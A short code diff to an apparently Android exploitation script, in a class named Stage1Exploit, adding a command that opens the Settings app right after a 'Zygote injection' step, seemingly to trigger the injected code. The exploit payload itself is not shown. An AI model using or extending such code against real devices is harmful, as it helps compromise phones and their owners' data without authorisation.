@@ -247,6 +247,7 @@ class Stage1Exploit:
 
         # run the exploit!
         self.shell_execute(exploit_command)
+        self.shell_execute(["am", "start", "-a", "android.settings.SETTINGS"])
         print("Zygote injection complete, waiting for code to execute...")
 
         for current_try in range(20):
